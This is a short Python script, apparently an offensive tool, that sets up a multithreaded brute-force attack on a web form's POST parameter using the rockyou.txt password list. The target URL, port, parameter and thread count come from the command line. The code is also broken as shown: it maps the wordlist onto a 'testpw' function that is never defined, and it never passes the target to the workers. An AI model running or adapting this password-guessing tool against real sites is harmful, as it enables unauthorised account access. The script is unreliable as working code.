import multiprocessing
import requests
import time
from contextlib import suppress
import sys
import argparse

def main():
    parser = argparse.ArgumentParser(description='Brute force an HTML POST request using rockyou.txt')
    parser.add_argument('-u', type=str, help='the target URL where we are POSTing to', required=True)
    parser.add_argument('-p', type=int, help='target port if required', required=False)
    parser.add_argument('-P', type=str, help='payload (name) to be brute forced', required=True)
    parser.add_argument('-tc',type=int, help='thread count to use (max 20)', required=False)

    args = parser.parse_args()

    url=""
    if str(args.u) != "":
        url = str(args.u)

    port = 0
    if args.p is not None:
        port = args.p

    payload=""
    if args.P is not None:
        payloadName=args.P

    #check for a thread-count argument, and apply it if necessary
    numThreads = 10
    if args.tc is not None:
        if args.tc <= 20 and args.tc >= 0:
            numThreads = args.tc

    #open the wordlist, encoded correctly, and split into an array
    wl = open("rockyou.txt", encoding='latin-1').read().splitlines()

    print("wordlist loaded, attacking: %s %d {%s} x %d..." % (url, port, payloadName, numThreads))

    p = multiprocessing.Pool(numThreads)
    p.map(testpw, wl)

if __name__ == "__main__":
    main()

   

